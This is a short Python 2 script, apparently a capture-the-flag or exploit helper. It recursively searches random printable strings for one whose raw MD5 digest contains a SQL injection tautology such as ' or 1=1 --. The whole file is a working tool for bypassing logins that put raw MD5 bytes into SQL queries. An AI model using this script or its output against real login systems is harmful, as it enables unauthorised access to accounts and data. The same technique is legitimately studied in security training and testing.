from hashlib import md5
import string, re, random

max_try_chars = 8
regex_pat = r".*?'\s*(?:or\s|\|\|)\s*(\d)\s*=\s*\1\s*--[\s'].*"

def find_collision(prefix_str, depth):
    if depth > max_try_chars:
        return None

    bin_prefix_str = md5( ''.join(prefix_str) ).digest()
    if re.match(regex_pat, bin_prefix_str) is not None:
        return ''.join(prefix_str)

    prefix_str.append(' ')
    for possible_char in random.sample(string.printable, 100):
        prefix_str[-1] = possible_char

        retval = find_collision(prefix_str, depth + 1)

        if retval is not None:
            return retval
    prefix_str.pop()
    return None

start_str = []
print find_collision(start_str, 0)
